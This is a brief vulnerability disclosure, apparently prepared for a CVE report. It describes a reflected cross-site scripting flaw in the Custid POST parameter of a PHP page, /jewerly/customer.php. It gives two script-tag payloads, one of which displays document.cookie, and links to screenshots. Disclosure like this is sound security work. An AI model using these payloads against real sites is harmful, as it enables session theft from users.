BUG_Author: dengbaihao

Vulnerability File: /jewerly/customer.php

POST Parameter Custid exists reflected cross-site scripting vulnerability

Payload1: Custid=<script>alert(999)</script>

![image](https://github.com/XIAONIGM/CVEReport/blob/main/1.png)

Payload2: Custid=<script>alert(document.cookie)</script>

![image](https://github.com/XIAONIGM/CVEReport/blob/main/2.png)
